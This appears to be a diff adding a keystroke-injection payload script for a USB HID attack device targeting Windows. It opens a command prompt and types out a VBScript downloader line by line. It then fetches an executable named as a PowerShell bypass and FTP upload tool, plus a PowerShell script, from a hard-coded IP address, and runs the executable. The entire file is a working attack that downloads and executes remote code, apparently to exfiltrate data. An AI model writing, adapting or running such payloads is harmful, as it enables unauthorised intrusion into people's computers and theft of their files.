@@ -1,0 +1,74 @@
+Press:177
+Press:128+177
+CustomDelay:400
+Print:cmd
+CustomDelay:400
+Press:176
+CustomDelay:400
+Print:cd Desktop
+CustomDelay:400
+Press:176
+CustomDelay:400
+Print:echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+Press:176
+Print:echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+Press:176
+Print:echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+Press:176
+Print:echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+Press:176
+Print:echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+Press:176
+Print:echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+Press:176
+Print:echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+Press:176
+Print:echo Err.Clear >> wget.vbs
+Press:176
+Print:echo Set http = Nothing >> wget.vbs
+Press:176
+Print:echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+Press:176
+Print:echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+Press:176
+Print:echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+Press:176
+Print:echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+Press:176
+Print:echo http.Open "GET",strURL,False >> wget.vbs
+Press:176
+Print:echo http.Send >> wget.vbs
+Press:176
+Print:echo varByteArray = http.ResponseBody >> wget.vbs
+Press:176
+Print:echo Set http = Nothing >> wget.vbs
+Press:176
+Print:echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+Press:176
+Print:echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+Press:176
+Print:echo strData = "" >> wget.vbs
+Press:176
+Print:echo strBuffer = "" >> wget.vbs
+Press:176
+Print:echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+Press:176
+Print:echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+Press:176
+Print:echo Next >> wget.vbs
+Press:176
+Print:echo ts.Close >> wget.vbs
+Press:176
+Press:128+99
+Press:176
+Print:cscript wget.vbs http://51.15.202.89/Sahil_powershell_bypass_ftp_upload.exe Sahil_powershell_bypass_ftp_upload.exe
+Press:176
+Print:cscript wget.vbs http://51.15.202.89/sahil_ftp.ps1 sahil_ftp.ps1
+Press:176
+Print:Sahil_powershell_bypass_ftp_upload.exe
+Press:176
+CustomDelay:400
+CustomDelay:400
+Press:176
+Print:exit
+Press:176
